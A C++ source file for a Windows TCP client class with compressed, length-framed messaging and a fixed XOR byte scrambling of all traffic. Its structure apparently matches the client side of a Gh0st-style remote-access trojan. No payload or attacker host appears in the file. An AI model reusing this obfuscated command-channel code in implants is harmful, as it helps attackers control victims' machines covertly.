// ClientSocket.cpp: implementation of the CClientSocket class.
//
//////////////////////////////////////////////////////////////////////

#include "ClientSocket.h"
#include "ClientSocket.h"
#include <process.h>
#include <MSTcpIP.h>
#include "Manager.h"
#include "until.h"
#include "..\Public\zlib\zlib.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
char* MyEncode(char *data,int len)
{
	for (int i = 0; i < len; i++)
	{
		data[i] ^= 0x99;
		data[i] -= 0x11;
	}
	return data;
}


char* MyDecode(char *data,int len)
{
	for (int i = 0; i < len; i++)
	{
		data[i] += 0x11;
		data[i] ^= 0x99;
	}
	return data;
}

CClientSocket::CClientSocket()
{
	WSADATA wsaData = {0};
 	WSAStartup(MAKEWORD(2, 2), &wsaData);
	m_hEvent = CreateEvent(NULL, true, false, NULL);
	m_bIsRunning = false;
	m_Socket = INVALID_SOCKET;
}

CClientSocket::~CClientSocket()
{
	m_bIsRunning = false;
	WaitForSingleObject(m_hWorkerThread, INFINITE);

	if (m_Socket != INVALID_SOCKET)
		Disconnect();

	CloseHandle(m_hWorkerThread);
	CloseHandle(m_hEvent);
	WSACleanup();
}

bool CClientSocket::Connect(LPCSTR lpszHost, UINT nPort)
{
	// 一定要清除一下，不然socket会耗尽系统资源
	Disconnect();
	// 重置事件对像
	ResetEvent(m_hEvent);
	m_bIsRunning = false;

	m_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 

	if (m_Socket == SOCKET_ERROR)   
	{ 
		return false;   
	}

	hostent* pHostent = NULL;
	pHostent = gethostbyname(lpszHost);

	if (pHostent == NULL)
		return false;
	
	// 构造sockaddr_in结构
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family	= AF_INET;
	ClientAddr.sin_port	= htons(nPort);

	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);

	if (connect(m_Socket, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)   
		return false;

	BOOL bKeepAlive = TRUE;
	DWORD dwBytesRetval;
	
	// Set KeepAlive 开启保活机制, 防止服务端产生死连接
	if (setsockopt(m_Socket,SOL_SOCKET,SO_KEEPALIVE,(const char*)&bKeepAlive,sizeof(bKeepAlive)) == 0)
	{
		// 设置超时详细信息
		tcp_keepalive t_keepalive;
		t_keepalive.onoff = true;// 启用保活
		t_keepalive.keepalivetime = (1000 * 60) * 3; // 3分钟超时 Keep Alive
		t_keepalive.keepaliveinterval = 1000 * 5;    // 重试间隔为5秒
		
		WSAIoctl(m_Socket,SIO_KEEPALIVE_VALS,&t_keepalive,sizeof(t_keepalive),&bKeepAlive,sizeof(BOOL),&dwBytesRetval,NULL,NULL);
	}

	m_bIsRunning = true;
	m_hWorkerThread = (HANDLE)MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL, true);

	return true;
}

DWORD WINAPI CClientSocket::WorkThread(LPVOID lparam)   
{
	CClientSocket *pThis = (CClientSocket *)lparam;
	char	buff[MAX_RECV_BUFFER];
	fd_set fdSocket;
	FD_ZERO(&fdSocket);
	FD_SET(pThis->m_Socket, &fdSocket);
	while (pThis->IsRunning())
	{
		fd_set fdRead = fdSocket;
		int nRet = select(NULL, &fdRead, NULL, NULL, NULL);
		if (nRet == SOCKET_ERROR)
		{
			pThis->Disconnect();
			break;
		}
		if (nRet > 0)
		{
			memset(buff, 0, sizeof(buff));
			int nSize = recv(pThis->m_Socket, buff, sizeof(buff), 0);
			if (nSize <= 0)
			{
				pThis->Disconnect();
				break;
			}
			if (nSize > 0) 
			{
				MyDecode((char *)buff,nSize);
				pThis->OnRead((LPBYTE)buff, nSize);
			}
		}
	}

	return -1;
}

void CClientSocket::run_event_loop()
{
	WaitForSingleObject(m_hEvent, INFINITE);
}

bool CClientSocket::IsRunning()
{
	return m_bIsRunning;
}

void CClientSocket::OnRead( LPBYTE lpBuffer, DWORD dwIoSize )
{
	if (dwIoSize == 0)
	{
		Disconnect();
		return;
	}

	// Add the message to out message
	// Dont forget there could be a partial, 1, 1 or more + partial mesages
	m_CompressionBuffer.Write(lpBuffer, dwIoSize);
	// Check real Data
	while (m_CompressionBuffer.GetBufferLen() > HDR_SIZE)
	{	
		int nSize = 0;
		CopyMemory(&nSize, m_CompressionBuffer.GetBuffer(0), sizeof(int));
		
		if (nSize && (m_CompressionBuffer.GetBufferLen()) >= nSize)
		{
			int nUnCompressLength = 0;
			// Read off header
			m_CompressionBuffer.Read((PBYTE) &nSize, sizeof(int));
			m_CompressionBuffer.Read((PBYTE) &nUnCompressLength, sizeof(int));
			////////////////////////////////////////////////////////
			////////////////////////////////////////////////////////
			// SO you would process your data here
			// 
			// I'm just going to post message so we can see the data
			int	nCompressLength = nSize - HDR_SIZE;
			PBYTE pData = new BYTE[nCompressLength];
			PBYTE pDeCompressionData = new BYTE[nUnCompressLength];
			
			if (pData == NULL || pDeCompressionData == NULL)
				throw "bad Allocate";
			m_CompressionBuffer.Read(pData, nCompressLength);

			unsigned long	destLen = nUnCompressLength;
			int	nRet = uncompress(pDeCompressionData, &destLen, pData, nCompressLength);
			//////////////////////////////////////////////////////////////////////////
			if (nRet == Z_OK)
			{
				m_DeCompressionBuffer.ClearBuffer();
				m_DeCompressionBuffer.Write(pDeCompressionData, destLen);
				m_pManager->OnReceive(m_DeCompressionBuffer.GetBuffer(0), m_DeCompressionBuffer.GetBufferLen());
			}

			delete [] pData;
			delete [] pDeCompressionData;
		}
		else
			break;
	}
}

void CClientSocket::Disconnect()
{
    //
    // If we're supposed to abort the connection, set the linger value
    // on the socket to 0.
    //
    LINGER lingerStruct;
    lingerStruct.l_onoff = 1;
    lingerStruct.l_linger = 0;
    setsockopt(m_Socket, SOL_SOCKET, SO_LINGER, (char *)&lingerStruct, sizeof(lingerStruct) );

	CancelIo((HANDLE) m_Socket);
	InterlockedExchange((LPLONG)&m_bIsRunning, false);
	closesocket(m_Socket);
	
	SetEvent(m_hEvent);	

	m_Socket = INVALID_SOCKET;
}

int CClientSocket::Send( LPBYTE lpData, UINT nSize )
{
	m_WriteBuffer.ClearBuffer();
	
	if (nSize > 0)
	{
		// Compress data
		unsigned long	destLen = (double)nSize * 1.001  + 12;
		LPBYTE			pDest = new BYTE[destLen];
		
		if (pDest == NULL)
			return 0;

		int	nRet = compress(pDest, &destLen, lpData, nSize);
		
		if (nRet != Z_OK)
		{
			delete [] pDest;
			return -1;
		}

		//////////////////////////////////////////////////////////////////////////
		LONG nBufLen = destLen + HDR_SIZE;
		// 4 byte header [Size of Entire Packet]
		m_WriteBuffer.Write((PBYTE) &nBufLen, sizeof(nBufLen));
		// 4 byte header [Size of UnCompress Entire Packet]
		m_WriteBuffer.Write((PBYTE) &nSize, sizeof(nSize));
		// Write Data
		m_WriteBuffer.Write(pDest, destLen);
		if (pDest)
			delete [] pDest;
	}

	// 分块发送
	return SendWithSplit(m_WriteBuffer.GetBuffer(), m_WriteBuffer.GetBufferLen(), MAX_SEND_BUFFER);
}

int CClientSocket::SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize)//修改的
{
	MyEncode((char *)lpData,nSize);

	int nRet = 0;
	const char *pbuf = (char *)lpData;
	int size = 0;
	int nSend = 0;
	int nSendRetry = 15;
	// 依次发送
	for( size = nSize; size >= nSplitSize; size -= nSplitSize )
	{
		BOOL bErrorOccurred = TRUE;

		int i = 0;
		for( i = 0; i < nSendRetry; i++ )
		{
			nRet = send(m_Socket, pbuf, nSplitSize, 0);

			if( nRet > 0 )
			{
				bErrorOccurred = FALSE;

				break;
			}
			else
			{
				Sleep(100);
			}
		}

		if( bErrorOccurred == TRUE )
		{
			return -1;
		}

		nSend += nRet;
		pbuf += nSplitSize;

		Sleep(10); // 必要的Sleep,过快会导致CPU使用率过高
	}

	// 发送最后的部分
	if( size > 0 )
	{
		BOOL bErrorOccurred = TRUE;
		
		int i = 0;
		for( i = 0; i < nSendRetry; i++ )
		{
			nRet = send(m_Socket, (char *)pbuf, size, 0);
			
			if( nRet > 0 )
			{
				bErrorOccurred = FALSE;
				
				break;
			}
			else
			{
				Sleep(100);
			}
		}
		
		if( bErrorOccurred == TRUE )
		{
			return -1;
		}
		
		nSend += nRet;
	}
	
	if( nSend == nSize )
	{
		return nSend;
	}
	
	return SOCKET_ERROR;
}


void CClientSocket::SetManagerCallBack( CManager *pManager )
{
	m_pManager = pManager;
}

